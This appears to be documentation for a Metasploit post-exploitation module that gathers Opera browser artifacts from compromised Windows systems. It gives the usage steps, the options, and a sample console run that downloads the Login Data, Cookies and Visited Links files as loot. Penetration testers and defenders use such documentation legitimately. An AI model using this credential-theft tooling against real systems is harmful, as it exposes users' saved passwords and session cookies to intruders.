## Module Description

This post-exploitation module gathers artifacts found on Opera related folders from end users systems.

The list of available artifcts are listed within the module and can be added at anytime. Each artifacts are categorised so that users can specify a category to look for.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/opera
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.

### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifcats/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by defalt and will perform the data extraction using the predefined regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Example Run
### Default Output
  ```
msf6 post(windows/gather/credentials/opera) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Opera's parent folder found
[*] Opera's Login data file found
[*] Downloading C:\Users\IEUser\AppData\Roaming\Opera Software\Opera Stable\Login Data
[*] Opera Login data downloaded
[+] File saved to:  /root/.msf4/loot/20210513121928_default_192.168.56.106_operaLoginData_680711.bin

[+] File with credentials saved:  /root/.msf4/loot/20210513121928_default_192.168.56.106_EXTRACTIONSLogin_648131.bin
[*] Opera's parent folder found
[*] Opera's Cookies file found
[*] Downloading C:\Users\IEUser\AppData\Roaming\Opera Software\Opera Stable\Cookies
[*] Opera Cookies downloaded
[+] File saved to:  /root/.msf4/loot/20210513121929_default_192.168.56.106_operaCookies_000286.bin

[+] File with credentials saved:  /root/.msf4/loot/20210513121929_default_192.168.56.106_EXTRACTIONSCooki_563880.bin
[*] Opera's parent folder found
[*] Opera's Visited links file found
[*] Downloading C:\Users\IEUser\AppData\Roaming\Opera Software\Opera Stable\Visited Links
[*] Opera Visited links downloaded
[+] File saved to:  /root/.msf4/loot/20210513121929_default_192.168.56.106_operaVisitedLin_749388.bin

[*] PackRat credential sweep Completed
[*] Post module execution completed

  ```